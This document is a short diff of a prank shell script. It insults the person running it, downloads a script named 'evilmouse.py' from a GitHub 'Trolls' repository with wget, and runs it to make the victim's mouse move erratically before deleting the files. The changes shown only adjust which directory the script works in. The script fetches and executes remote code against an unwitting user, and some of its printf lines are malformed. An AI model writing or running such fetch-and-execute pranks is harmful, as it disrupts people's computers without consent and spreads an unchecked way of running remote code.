@@ -2,7 +2,7 @@
 
 echo "Fuck your life. You will be running evilmouse in a minny"
 cd
-cd "$HOME/Desktop"
+# cd "$HOME/Desktop"
 mkdir evilmouse
 cd evilmouse
 wget https://raw.githubusercontent.com/eLVee1991/Trolls/master/evilmouse.py
@@ -14,7 +14,7 @@ printf "-"*60 "/n"
 echo "Trolling you now. You're fucked for a while. Your mouse will go crazy."
 printf "-"*60 "/n"
 python3 evilmouse.py
-cd "$HOME/Desktop"
+cd "../"
 rm -rf evilmouse
 printf "-"*60 "/n"
 echo "You have been trolled."
